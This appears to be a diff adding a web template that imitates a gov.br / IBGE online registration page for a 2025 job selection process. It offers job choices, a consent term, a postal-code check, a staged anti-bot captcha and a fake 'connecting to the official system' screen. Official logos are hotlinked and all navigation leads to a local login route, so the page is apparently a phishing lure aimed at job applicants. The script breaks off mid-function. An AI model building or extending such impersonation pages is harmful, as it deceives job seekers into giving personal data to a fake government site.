@@ -1,0 +1,1032 @@
+{% extends "base.html" %}
+
+{% block content %}
+<!-- Top bar -->
+<div class="bg-[#0B2341] w-full">
+    <div class="flex items-center h-[42px]">
+        <div class="flex items-center h-full pl-4 pr-4 min-w-0">
+            <a href="{{ url_for('login') }}" class="flex items-center h-full">
+                <img src="https://www.gov.br/governodigital/pt-br/estrategias-e-governanca-digital/EGD2020/imagens/logo-white.png" alt="gov.br logo, white text on transparent background" style="height: 20px; width: auto;"/>
+            </a>
+        </div>
+        <div class="h-4 w-px bg-[#33507A] mx-3"></div>
+        <div class="flex-1"></div>
+        <div class="flex items-center h-full pr-2">
+            <a href="{{ url_for('login') }}" class="header-menu text-white font-bold px-3 h-full flex items-center cursor-pointer hover:bg-[#33507A] transition-colors whitespace-nowrap text-xs">
+                ACESSO À INFORMAÇÃO
+            </a>
+            <div class="h-4 w-px bg-[#33507A] mx-1"></div>
+            <a href="{{ url_for('login') }}" class="header-menu text-white font-bold px-3 h-full flex items-center cursor-pointer hover:bg-[#33507A] transition-colors text-xs">
+                PARTICIPE
+            </a>
+            <div class="h-4 w-px bg-[#33507A] mx-1"></div>
+            <a href="{{ url_for('login') }}" class="header-menu text-white font-bold px-3 h-full flex items-center cursor-pointer hover:bg-[#33507A] transition-colors text-xs">
+                LEGISLAÇÃO
+            </a>
+        </div>
+    </div>
+</div>
+
+<!-- IBGE logo and language -->
+<div class="w-full flex flex-col items-center pt-6 pb-2 bg-white">
+    <img alt="IBGE logo azul, texto e símbolo geométrico em fundo transparente" class="mb-2" src="https://www.ibge.gov.br/templates/novo_portal_base/imagens/logo_mobile.png" style="width:125px; height:24px;"/>
+    <div class="relative">
+        <div class="flex items-center space-x-2 mt-1 cursor-pointer hover:bg-gray-50 px-2 py-1 rounded transition-colors" id="language-selector">
+            <img alt="Brazilian flag" class="w-6 h-5 rounded shadow-sm border border-gray-200" src="https://www.ibge.gov.br/templates/novo_portal_base/imagens/pt_br.png"/>
+            <div class="h-7 w-px bg-gray-300 mx-1"></div>
+            <img alt="Globe icon for language selection" class="w-6 h-6" src="https://www.ibge.gov.br/media/mod_gtranslate/flags/svg/globe.svg"/>
+            <span class="text-[#444] text-sm font-normal">
+                Outros idiomas
+            </span>
+            <i class="fas fa-chevron-down text-gray-500 ml-1 text-xs transition-transform duration-200" id="language-chevron"></i>
+        </div>
+        
+        <!-- Language dropdown -->
+        <div id="language-dropdown" class="absolute top-full left-1/2 transform -translate-x-1/2 mt-2 bg-white border border-gray-200 rounded-lg shadow-lg z-50 hidden w-56">
+            <div class="max-h-48 overflow-y-auto py-2">
+                <a href="#" class="flex items-center px-3 py-2 hover:bg-gray-50 text-sm text-gray-700">
+                    <img src="https://flagcdn.com/w20/us.png" alt="English" class="w-5 h-4 mr-3 rounded"/>
+                    <span>English</span>
+                </a>
+                <a href="#" class="flex items-center px-3 py-2 hover:bg-gray-50 text-sm text-gray-700">
+                    <img src="https://flagcdn.com/w20/es.png" alt="Español" class="w-5 h-4 mr-3 rounded"/>
+                    <span>Español</span>
+                </a>
+                <a href="#" class="flex items-center px-3 py-2 hover:bg-gray-50 text-sm text-gray-700">
+                    <img src="https://flagcdn.com/w20/fr.png" alt="Français" class="w-5 h-4 mr-3 rounded"/>
+                    <span>Français</span>
+                </a>
+                <a href="#" class="flex items-center px-3 py-2 hover:bg-gray-50 text-sm text-gray-700">
+                    <img src="https://flagcdn.com/w20/de.png" alt="Deutsch" class="w-5 h-4 mr-3 rounded"/>
+                    <span>Deutsch</span>
+                </a>
+                <a href="#" class="flex items-center px-3 py-2 hover:bg-gray-50 text-sm text-gray-700">
+                    <img src="https://flagcdn.com/w20/it.png" alt="Italiano" class="w-5 h-4 mr-3 rounded"/>
+                    <span>Italiano</span>
+                </a>
+                <a href="#" class="flex items-center px-3 py-2 hover:bg-gray-50 text-sm text-gray-700">
+                    <img src="https://flagcdn.com/w20/jp.png" alt="日本語" class="w-5 h-4 mr-3 rounded"/>
+                    <span>日本語</span>
+                </a>
+                <a href="#" class="flex items-center px-3 py-2 hover:bg-gray-50 text-sm text-gray-700">
+                    <img src="https://flagcdn.com/w20/cn.png" alt="中文" class="w-5 h-4 mr-3 rounded"/>
+                    <span>中文</span>
+                </a>
+                <a href="#" class="flex items-center px-3 py-2 hover:bg-gray-50 text-sm text-gray-700">
+                    <img src="https://flagcdn.com/w20/ru.png" alt="Русский" class="w-5 h-4 mr-3 rounded"/>
+                    <span>Русский</span>
+                </a>
+                <a href="#" class="flex items-center px-3 py-2 hover:bg-gray-50 text-sm text-gray-700">
+                    <img src="https://flagcdn.com/w20/ar.png" alt="العربية" class="w-5 h-4 mr-3 rounded"/>
+                    <span>العربية</span>
+                </a>
+                <a href="#" class="flex items-center px-3 py-2 hover:bg-gray-50 text-sm text-gray-700">
+                    <img src="https://flagcdn.com/w20/pt.png" alt="Português (Portugal)" class="w-5 h-4 mr-3 rounded"/>
+                    <span>Português (Portugal)</span>
+                </a>
+                <a href="#" class="flex items-center px-3 py-2 hover:bg-gray-50 text-sm text-gray-700">
+                    <img src="https://flagcdn.com/w20/nl.png" alt="Nederlands" class="w-5 h-4 mr-3 rounded"/>
+                    <span>Nederlands</span>
+                </a>
+                <a href="#" class="flex items-center px-3 py-2 hover:bg-gray-50 text-sm text-gray-700">
+                    <img src="https://flagcdn.com/w20/kr.png" alt="한국어" class="w-5 h-4 mr-3 rounded"/>
+                    <span>한국어</span>
+                </a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Navigation bar -->
+<div class="w-full bg-white relative">
+    <div class="flex items-center px-6 py-2">
+        <span class="text-[#222] font-normal text-sm">
+            Instituto Brasileiro de Geografia e Estatística
+        </span>
+        <div class="flex-1"></div>
+    </div>
+    
+    <!-- Sidebar Menu -->
+    <div id="sidebar-menu" class="fixed inset-y-0 left-0 z-50 w-80 bg-white shadow-lg transform -translate-x-full transition-transform duration-300 ease-in-out">
+        <div class="flex flex-col h-full">
+            <!-- Header do Menu -->
+            <div class="flex items-center justify-between p-4 border-b border-gray-200">
+                <h2 class="text-lg font-semibold text-[#0B2341]">Menu</h2>
+                <i class="fas fa-times text-[#0B2341] text-xl cursor-pointer hover:text-[#184A8C] transition-colors" id="menu-close"></i>
+            </div>
+            
+            <!-- Itens do Menu -->
+            <div class="flex-1 overflow-y-auto p-4">
+                <nav class="space-y-2">
+                    <a href="{{ url_for('login') }}" class="flex items-center justify-between p-3 text-[#0B2341] hover:bg-gray-50 hover:text-[#184A8C] transition-colors rounded">
+                        <span class="text-sm font-medium">Estatísticas</span>
+                        <i class="fas fa-chevron-right text-xs"></i>
+                    </a>
+                    
+                    <a href="{{ url_for('login') }}" class="flex items-center justify-between p-3 text-[#0B2341] hover:bg-gray-50 hover:text-[#184A8C] transition-colors rounded">
+                        <span class="text-sm font-medium">Geociências</span>
+                        <i class="fas fa-chevron-right text-xs"></i>
+                    </a>
+                    
+                    <a href="{{ url_for('login') }}" class="flex items-center p-3 text-[#0B2341] hover:bg-gray-50 hover:text-[#184A8C] transition-colors rounded">
+                        <span class="text-sm font-medium">Painel de Indicadores</span>
+                    </a>
+                    
+                    <a href="{{ url_for('login') }}" class="flex items-center p-3 text-[#0B2341] hover:bg-gray-50 hover:text-[#184A8C] transition-colors rounded">
+                        <span class="text-sm font-medium">Cidades e Estados</span>
+                    </a>
+                    
+                    <a href="{{ url_for('login') }}" class="flex items-center p-3 text-[#0B2341] hover:bg-gray-50 hover:text-[#184A8C] transition-colors rounded">
+                        <span class="text-sm font-medium">Séries Históricas</span>
+                    </a>
+                    
+                    <a href="{{ url_for('login') }}" class="flex items-center p-3 text-[#0B2341] hover:bg-gray-50 hover:text-[#184A8C] transition-colors rounded">
+                        <span class="text-sm font-medium">Downloads</span>
+                    </a>
+                    
+                    <a href="{{ url_for('login') }}" class="flex items-center p-3 text-[#0B2341] hover:bg-gray-50 hover:text-[#184A8C] transition-colors rounded">
+                        <span class="text-sm font-medium">Biblioteca</span>
+                    </a>
+                    
+                    <a href="{{ url_for('login') }}" class="flex items-center p-3 text-[#0B2341] hover:bg-gray-50 hover:text-[#184A8C] transition-colors rounded">
+                        <span class="text-sm font-medium">Cartografia</span>
+                    </a>
+                    
+                    <a href="{{ url_for('login') }}" class="flex items-center p-3 text-[#0B2341] hover:bg-gray-50 hover:text-[#184A8C] transition-colors rounded">
+                        <span class="text-sm font-medium">Institucional</span>
+                    </a>
+                    
+                    <a href="{{ url_for('login') }}" class="flex items-center p-3 text-[#0B2341] hover:bg-gray-50 hover:text-[#184A8C] transition-colors rounded">
+                        <span class="text-sm font-medium">Ouvidoria</span>
+                    </a>
+                    
+                    <a href="{{ url_for('login') }}" class="flex items-center p-3 text-[#0B2341] hover:bg-gray-50 hover:text-[#184A8C] transition-colors rounded">
+                        <span class="text-sm font-medium">Fale Conosco</span>
+                    </a>
+                </nav>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Overlay para fechar o menu ao clicar fora -->
+    <div id="menu-overlay" class="fixed inset-0 bg-black bg-opacity-50 z-40 hidden"></div>
+</div>
+
+<!-- Main Content -->
+<div class="bg-gray-50 min-h-screen relative">
+    <!-- IBGE Logo Watermark -->
+    <div class="fixed inset-0 pointer-events-none overflow-hidden" style="z-index: 1;">
+        <!-- Logo única ocupando toda largura -->
+        <div class="absolute select-none" 
+             style="top: 50%; left: 0; right: 0; transform: translateY(-50%) rotate(25deg); transform-origin: center;">
+            <img src="https://logodownload.org/wp-content/uploads/2018/02/ibge-logo.png" 
+                 alt="IBGE Watermark" 
+                 class="opacity-25 w-full h-auto max-w-none"
+                 style="filter: grayscale(40%); width: 90vw; margin-left: -5vw;">
+        </div>
+    </div>
+    
+    <div class="container mx-auto px-4 py-12 relative" style="z-index: 5;">
+        <!-- Cabeçalho do Formulário -->
+        <section class="bg-white border border-gray-300 shadow-sm mb-8">
+            <div class="bg-[#0B2341] text-white px-6 py-4">
+                <div class="flex items-center">
+                    <img src="https://www.ibge.gov.br/templates/novo_portal_base/imagens/logo_mobile.png" alt="IBGE" class="h-8 mr-4 filter brightness-0 invert">
+                    <div>
+                        <h1 class="text-xl font-bold">PROCESSO SELETIVO SIMPLIFICADO IBGE 2025</h1>
+                        <p class="text-sm text-gray-200">EDITAL Nº 001/2025 - FORMULÁRIO DE INSCRIÇÃO</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="bg-[#184A8C] text-white px-6 py-3">
+                <p class="text-sm font-medium">CONFIRMAÇÃO DOS DADOS DE INSCRIÇÃO</p>
+                <p class="text-xs text-gray-200">Confira atentamente todas as informações antes de finalizar sua inscrição</p>
+            </div>
+        </section>
+
+        <div class="max-w-4xl mx-auto space-y-8">
+            <!-- Cargos Disponíveis -->
+            <section class="bg-white border border-gray-200 shadow-sm">
+                <div class="border-b border-gray-200 bg-gray-50 px-6 py-4">
+                    <h2 class="text-xl font-semibold text-gray-800">1. Seleção de Cargo</h2>
+                    <p class="text-gray-600 text-sm mt-1">Escolha o cargo para o qual deseja se candidatar</p>
+                </div>
+                
+                <div class="p-6">
+                    <div class="space-y-4">
+                        <!-- Agente de Pesquisas e Mapeamento -->
+                        <label for="cargo-agente" class="cursor-pointer">
+                            <div class="border border-gray-300 bg-white hover:border-blue-500 hover:bg-blue-50 transition-all duration-200 rounded-lg">
+                                <div class="p-4">
+                                    <div class="flex items-start">
+                                        <input type="radio" name="cargo" value="agente" id="cargo-agente" class="mt-1 mr-4" onchange="selecionarCargo('agente')">
+                                        <div class="flex-1">
+                                            <div class="font-semibold text-lg text-gray-800 block">
+                                                Agente de Pesquisas e Mapeamento
+                                            </div>
+                                            <div class="mt-3 grid grid-cols-1 md:grid-cols-3 gap-4 text-sm text-gray-600">
+                                                <div>
+                                                    <span class="font-medium text-gray-700">Escolaridade:</span><br>
+                                                    Ensino médio completo
+                                                </div>
+                                                <div>
+                                                    <span class="font-medium text-gray-700">Vagas:</span><br>
+                                                    8.480 vagas
+                                                </div>
+                                                <div>
+                                                    <span class="font-medium text-gray-700">Remuneração:</span><br>
+                                                    R$ 4.379,00 a R$ 5.866,00
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </label>
+
+                        <!-- Supervisor de Coleta e Qualidade -->
+                        <div class="border border-gray-300 bg-white rounded-lg">
+                            <label for="cargo-supervisor" class="cursor-pointer">
+                                <div class="p-4 hover:border-blue-500 hover:bg-blue-50 transition-all duration-200 border border-transparent rounded-lg">
+                                    <div class="flex items-start">
+                                        <input type="radio" name="cargo" value="supervisor" id="cargo-supervisor" class="mt-1 mr-4" onchange="selecionarCargo('supervisor')">
+                                        <div class="flex-1">
+                                            <div class="font-semibold text-lg text-gray-800 block">
+                                                Supervisor de Coleta e Qualidade
+                                            </div>
+                                            <div class="mt-3 grid grid-cols-1 md:grid-cols-3 gap-4 text-sm text-gray-600">
+                                                <div>
+                                                    <span class="font-medium text-gray-700">Escolaridade:</span><br>
+                                                    Ensino médio + CNH cat. "B"
+                                                </div>
+                                                <div>
+                                                    <span class="font-medium text-gray-700">Vagas:</span><br>
+                                                    1.100 vagas
+                                                </div>
+                                                <div>
+                                                    <span class="font-medium text-gray-700">Remuneração:</span><br>
+                                                    R$ 9.000,00 a R$ 13.980,00
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </label>
+                            
+                            <!-- Campo de Categoria de Habilitação (aparece apenas quando Supervisor é selecionado) -->
+                            <div id="categoria-habilitacao" class="hidden border-t border-gray-200 bg-gray-50 p-4">
+                                <h4 class="font-medium text-gray-800 mb-3">Categoria de Habilitação</h4>
+                                <div class="space-y-2">
+                                    <label class="flex items-center p-2 rounded cursor-pointer hover:bg-gray-100 transition-colors categoria-cnh-option border border-transparent">
+                                        <input type="radio" name="categoria_cnh" value="B" class="mr-2" onchange="updateCategoriaSelection(); validarFormulario()">
+                                        <span class="text-sm text-gray-700">Categoria B - Veículos de passeio</span>
+                                    </label>
+                                    <label class="flex items-center p-2 rounded cursor-pointer hover:bg-gray-100 transition-colors categoria-cnh-option border border-transparent">
+                                        <input type="radio" name="categoria_cnh" value="C" class="mr-2" onchange="updateCategoriaSelection(); validarFormulario()">
+                                        <span class="text-sm text-gray-700">Categoria C - Veículos de carga</span>
+                                    </label>
+                                    <label class="flex items-center p-2 rounded cursor-pointer hover:bg-gray-100 transition-colors categoria-cnh-option border border-transparent">
+                                        <input type="radio" name="categoria_cnh" value="D" class="mr-2" onchange="updateCategoriaSelection(); validarFormulario()">
+                                        <span class="text-sm text-gray-700">Categoria D - Veículos de transporte de passageiros</span>
+                                    </label>
+                                    <label class="flex items-center p-2 rounded cursor-pointer hover:bg-gray-100 transition-colors categoria-cnh-option border border-transparent">
+                                        <input type="radio" name="categoria_cnh" value="E" class="mr-2" onchange="updateCategoriaSelection(); validarFormulario()">
+                                        <span class="text-sm text-gray-700">Categoria E - Veículos com reboque</span>
+                                    </label>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Termos de Uso -->
+            <section class="bg-white border border-gray-200 shadow-sm">
+                <div class="border-b border-gray-200 bg-gray-50 px-6 py-4">
+                    <h2 class="text-xl font-semibold text-gray-800">2. Termo de Consentimento</h2>
+                    <p class="text-gray-600 text-sm mt-1">Autorização para tratamento de dados pessoais</p>
+                </div>
+                
+                <div class="p-6">
+                    <div class="bg-gray-50 border border-gray-200 p-4 max-h-48 overflow-y-auto mb-6">
+                        <div class="text-sm text-gray-700 space-y-4">
+                            <div>
+                                <p class="font-semibold text-gray-800 mb-2">TERMO DE CONSENTIMENTO PARA TRATAMENTO DE DADOS PESSOAIS</p>
+                                <p>Ao aceitar este termo, você autoriza o Instituto Brasileiro de Geografia e Estatística (IBGE) a:</p>
+                            </div>
+                            
+                            <ul class="list-disc list-inside space-y-1 ml-4">
+                                <li>Utilizar os dados pessoais fornecidos pelo sistema gov.br para processamento da inscrição</li>
+                                <li>Armazenar informações pessoais em conformidade com a Lei Geral de Proteção de Dados (LGPD)</li>
+                                <li>Processar dados para verificação de elegibilidade e comunicações do processo seletivo</li>
+                                <li>Compartilhar informações com órgãos competentes para validação quando necessário</li>
+                                <li>Manter dados pelo período legalmente exigido</li>
+                            </ul>
+                            
+                            <div>
+                                <p class="font-medium">Seus direitos incluem:</p>
+                                <ul class="list-disc list-inside space-y-1 ml-4 mt-1">
+                                    <li>Acesso aos seus dados pessoais</li>
+                                    <li>Correção de dados incompletos ou inexatos</li>
+                                    <li>Eliminação de dados desnecessários</li>
+                                    <li>Revogação do consentimento</li>
+                                </ul>
+                            </div>
+                            
+                            <p class="text-xs text-gray-500">Para exercer seus direitos, entre em contato através dos canais oficiais do IBGE.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="cursor-pointer">
+                        <label for="aceito-termos" class="flex items-start cursor-pointer p-2 rounded hover:bg-gray-50 transition-colors">
+                            <input type="checkbox" id="aceito-termos" class="mt-1 mr-3 h-4 w-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500">
+                            <span class="text-sm text-gray-700">
+                                <span class="font-medium">Declaro que li e aceito</span> os termos de tratamento de dados pessoais fornecidos pelo sistema gov.br
+                            </span>
+                        </label>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Verificação de CEP -->
+            <section class="bg-white border border-gray-200 shadow-sm">
+                <div class="border-b border-gray-200 bg-gray-50 px-6 py-4">
+                    <h2 class="text-xl font-semibold text-gray-800">3. Verificação Regional</h2>
+                    <p class="text-gray-600 text-sm mt-1">Confirme a disponibilidade de vagas na sua região</p>
+                </div>
+                
+                <div class="p-6">
+                    <div class="mb-4">
+                        <label for="cep" class="block text-sm font-medium text-gray-700 mb-2">
+                            CEP de residência:
+                        </label>
+                        <div class="flex gap-3 max-w-md">
+                            <input type="text" 
+                                   id="cep" 
+                                   placeholder="00000-000" 
+                                   maxlength="9"
+                                   class="flex-1 px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                                   style="font-size: 16px;">
+                            <button onclick="verificarCEP()" 
+                                    class="bg-[#0B2341] text-white px-6 py-2 rounded hover:bg-[#071d41] transition-colors font-medium">
+                                Verificar
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div id="resultado-cep" class="hidden mt-4 p-4 rounded border">
+                        <!-- Resultado da verificação será exibido aqui -->
+                    </div>
+                </div>
+            </section>
+
+            <!-- Botão Prosseguir Inscrição -->
+            <div class="text-center py-8">
+                <button id="btn-prosseguir" 
+                        onclick="prosseguirInscricao()" 
+                        class="bg-[#0B2341] text-white px-12 py-4 rounded font-semibold hover:bg-[#071d41] transition-colors cursor-pointer text-lg">
+                    Prosseguir Inscrição
+                </button>
+            </div>
+                
+                <!-- Informações de segurança -->
+                <div class="bg-white rounded-lg p-4 mt-6 max-w-md mx-auto border border-gray-200 shadow-md">
+                    <h3 class="font-semibold text-gray-900 mb-3 flex items-center justify-center">
+                        <img src="https://www.gov.br/agricultura/pt-br/agroform/brasao-sem-fundo.png" 
+                             alt="Brasão da República" 
+                             class="w-5 h-5 mr-2"
+                             onerror="this.style.display='none';">
+                        Segurança
+                    </h3>
+                    <ul class="text-sm text-gray-600 space-y-2">
+                        <li class="flex items-start">
+                            <svg class="w-4 h-4 text-green-500 mr-2 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"/>
+                            </svg>
+                            Dados protegidos por criptografia
+                        </li>
+                        <li class="flex items-start">
+                            <svg class="w-4 h-4 text-green-500 mr-2 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"/>
+                            </svg>
+                            Integração oficial RFB
+                        </li>
+                        <li class="flex items-start">
+                            <svg class="w-4 h-4 text-green-500 mr-2 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"/>
+                            </svg>
+                            Protocolo HTTPS
+                        </li>
+                        <li class="flex items-start">
+                            <svg class="w-4 h-4 text-green-500 mr-2 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"/>
+                            </svg>
+                            Sem armazenamento de dados
+                        </li>
+                    </ul>
+                </div>
+                
+                <!-- Campo de Recomendação -->
+                <div class="mt-6 bg-blue-50 border-l-4 border-[#184A8C] p-4 max-w-md mx-auto">
+                    <h4 class="font-semibold text-[#0B2341] mb-2">Recomendação</h4>
+                    <p class="text-gray-700 text-sm">
+                        Acompanhe regularmente as publicações oficiais do IBGE e do Ministério da Gestão e Inovação 
+                        em Serviços Públicos para informações atualizadas sobre concursos e processos seletivos.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Footer igual ao da página inicial -->
+{% include 'footer_include.html' %}
+
+<!-- Modal Captcha -->
+<div id="captcha-modal" class="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 hidden p-4">
+    <div class="bg-white shadow-2xl w-full max-w-lg mx-auto overflow-hidden rounded-xl">
+        <!-- Header do modal -->
+        <div class="bg-gradient-to-r from-blue-800 to-blue-900 px-6 py-4">
+            <div class="flex items-center">
+                <div>
+                    <h3 class="text-lg font-bold text-white">Verificação Anti-Bot</h3>
+                    <p class="text-blue-100 text-sm">Verificação Obrigatória de Segurança • Portal gov.br</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Corpo do modal -->
+        <div class="px-6 py-6">
+            <div class="p-4 mb-4">
+                <p class="text-black text-sm">
+                    Digite o código exibido abaixo. Esta verificação é obrigatória conforme protocolos de segurança do governo federal.
+                </p>
+            </div>
+            
+            <!-- Captcha visual -->
+            <div class="relative bg-white h-32 rounded-lg border-2 border-gray-400 mb-4 overflow-hidden flex items-center justify-center" id="captcha-display">
+                <div class="text-center">
+                    <div id="captcha-text" class="text-3xl font-bold text-gray-800 tracking-wider select-none" 
+                         style="text-shadow: 1px 1px 2px rgba(0,0,0,0.3); font-family: 'Courier New', monospace;">
+                        <!-- Código será gerado aqui -->
+                    </div>
+                    <div class="text-xs text-gray-500 mt-2">Digite o código acima</div>
+                </div>
+                
+                <!-- Indicadores de segurança -->
+                <div class="absolute top-2 left-2 bg-green-600 text-white text-xs px-2 py-1 rounded font-bold">
+                    SEGURO
+                </div>
+                <div class="absolute top-2 right-2 bg-blue-600 text-white text-xs px-2 py-1 rounded font-bold">
+                    GOV.BR
+                </div>
+            </div>
+            
+            <!-- Campo de entrada -->
+            <div class="mb-4">
+                <input type="text" 
+                       id="captcha-input" 
+                       placeholder="Digite o código"
+                       maxlength="6"
+                       class="w-full px-4 py-3 border-2 border-gray-300 rounded-lg text-center text-lg font-bold tracking-wider focus:border-blue-500 focus:outline-none"
+                       style="font-family: 'Courier New', monospace;">
+                <div id="captcha-error" class="text-red-600 text-sm mt-1 hidden">Código incorreto. Tente novamente.</div>
+            </div>
+            
+            <!-- Botões -->
+            <div class="flex gap-3 mb-4">
+                <button id="refresh-captcha" class="flex-1 bg-gray-500 hover:bg-gray-600 text-white py-2 px-4 rounded-lg text-sm font-medium">
+                    Gerar Novo Código
+                </button>
+                <button id="verify-captcha" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 rounded-lg text-sm font-medium">
+                    Verificar
+                </button>
+            </div>
+            
+            <div class="flex items-center justify-between">
+                <div class="text-xs text-gray-500">
+                    <svg class="w-4 h-4 inline mr-1" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1Z"/>
+                    </svg>
+                    Proteção contra automação
+                </div>
+                <button id="fechar-captcha" class="text-gray-500 hover:text-gray-700 text-sm underline">
+                    Cancelar verificação
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Tela de carregamento com brasão -->
+<div id="loading-screen" class="fixed inset-0 z-50 hidden flex items-center justify-center" style="backdrop-filter: blur(8px); background-color: rgba(255, 255, 255, 0.7);">
+    <div class="text-center">
+        <img src="https://www.gov.br/agricultura/pt-br/agroform/brasao-sem-fundo.png" 
+             alt="Brasão da República" 
+             class="w-48 h-48 mx-auto mb-6 animate-pulse-slow"
+             style="animation: pulse-slow 1.5s ease-in-out infinite;"
+             onerror="this.style.display='none';">
+        <p class="text-gray-800 text-xl font-medium bg-white bg-opacity-80 px-6 py-2 rounded-lg shadow-lg">Conectando com o sistema oficial...</p>
+        <p class="text-gray-600 text-sm mt-2 bg-white bg-opacity-60 px-4 py-1 rounded">Aguarde, por favor</p>
+    </div>
+</div>
+
+<style>
+@keyframes pulse-slow {
+    0%, 100% { opacity: 0.6; transform: scale(1); }
+    50% { opacity: 1; transform: scale(1.05); }
+}
+.animate-pulse-slow {
+    animation: pulse-slow 1.5s ease-in-out infinite;
+}
+</style>
+
+<script>
+let cargoSelecionado = null;
+let cepVerificado = false;
+let termosAceitos = false;
+let captchaVerificado = false;
+let currentCaptcha = '';
+
+function selecionarCargo(cargo) {
+    console.log('selecionarCargo chamada com:', cargo);
+    cargoSelecionado = cargo;
+    
+    // Marcar o radio button correto
+    const radioAgente = document.getElementById('cargo-agente');
+    const radioSupervisor = document.getElementById('cargo-supervisor');
+    
+    if (cargo === 'agente') {
+        radioAgente.checked = true;
+        radioSupervisor.checked = false;
+    } else if (cargo === 'supervisor') {
+        radioSupervisor.checked = true;
+        radioAgente.checked = false;
+    }
+    
+    // Mostrar campo de categoria de habilitação se supervisor foi selecionado
+    const categoriaDiv = document.getElementById('categoria-habilitacao');
+    if (cargo === 'supervisor') {
+        categoriaDiv.classList.remove('hidden');
+    } else {
+        categoriaDiv.classList.add('hidden');
+        // Limpar seleção de categoria se mudou de supervisor para agente
+        const categoriasRadios = document.querySelectorAll('input[name="categoria_cnh"]');
+        categoriasRadios.forEach(radio => radio.checked = false);
+    }
+    
+    console.log('cargoSelecionado agora é:', cargoSelecionado);
+    verificarFormulario();
+}
+
+function verificarCEP() {
+    const cep = document.getElementById('cep').value.replace(/\D/g, '');
+    const resultadoDiv = document.getElementById('resultado-cep');
+    
+    if (cep.length !== 8) {
+        mostrarResultadoCEP('erro', 'CEP inválido. Digite um CEP com 8 dígitos.');
+        return;
+    }
+    
+    // Mostrar loading durante busca
+    mostrarResultadoCEP('loading', 'Verificando CEP...');
+    
+    // Aguardar 3 segundos antes de fazer a consulta
+    setTimeout(() => {
+        // Buscar dados do CEP na API ViaCEP
+        fetch(`https://viacep.com.br/ws/${cep}/json/`)
+        .then(response => {
+            if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
+            }
+            return response.json();
+        })
+        .then(data => {
+            if (data.erro) {
+                mostrarResultadoCEP('erro', 'CEP não encontrado. Verifique o número digitado.');
+                cepVerificado = false;
+            } else {
+                // Formatar e exibir dados do endereço
+                const enderecoHtml = `
+                    <div class="bg-green-50 border border-green-200 rounded-lg p-4">
+                        <h4 class="font-semibold text-green-800 mb-3 flex items-center">
+                            <svg class="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"/>
+                            </svg>
+                            Endereço localizado - Confirme:
+                        </h4>
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-3 text-sm text-gray-700">
+                            <div><strong>CEP:</strong> ${data.cep}</div>
+                            <div><strong>Logradouro:</strong> ${data.logradouro}</div>
+                            <div><strong>Bairro:</strong> ${data.bairro}</div>
+                            <div><strong>Cidade:</strong> ${data.localidade}</div>
+                            <div><strong>UF:</strong> ${data.uf}</div>
+                            <div><strong>Estado:</strong> ${data.estado || data.uf}</div>
+                            ${data.regiao ? `<div><strong>Região:</strong> ${data.regiao}</div>` : ''}
+                            ${data.ddd ? `<div><strong>DDD:</strong> ${data.ddd}</div>` : ''}
+                        </div>
+                        
+
+                    </div>
+                `;
+                
+                resultadoDiv.innerHTML = enderecoHtml;
+                resultadoDiv.classList.remove('hidden');
+                
+                // Adicionar checkbox de confirmação fora da caixa
+                const checkboxHtml = `
+                    <div class="mt-4" id="checkbox-container">
+                        <label for="endereco-correto" class="flex items-center cursor-pointer p-3 rounded bg-gray-50 border border-gray-200 hover:bg-gray-100 transition-colors">
+                            <input type="checkbox" id="endereco-correto" class="mr-3 h-4 w-4 text-green-600 border-gray-300 rounded focus:ring-green-500">
+                            <span class="text-sm text-gray-700 font-medium">Meu endereço está correto</span>
+                        </label>
+                    </div>
+                `;
+                resultadoDiv.insertAdjacentHTML('afterend', checkboxHtml);
+                
+                // Event listener já está configurado no documento
+                
+                // CEP não é verificado até o usuário confirmar o endereço
+                cepVerificado = false;
+                verificarFormulario();
+            }
+        })
+        .catch(error => {
+            console.error('Erro ao buscar CEP:', error);
+            mostrarResultadoCEP('erro', 'Erro ao verificar CEP. Verifique sua conexão e tente novamente.');
+            cepVerificado = false;
+            verificarFormulario();
+        });
+    }, 3000); // Delay de 3 segundos
+}
+
+function mostrarResultadoCEP(tipo, mensagem) {
+    const resultadoDiv = document.getElementById('resultado-cep');
+    
+    if (tipo === 'loading') {
+        resultadoDiv.className = 'mt-4 p-4 rounded-lg bg-blue-50 border border-blue-200 text-blue-700';
+        resultadoDiv.innerHTML = `
+            <div class="flex items-center">
+                <svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-blue-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
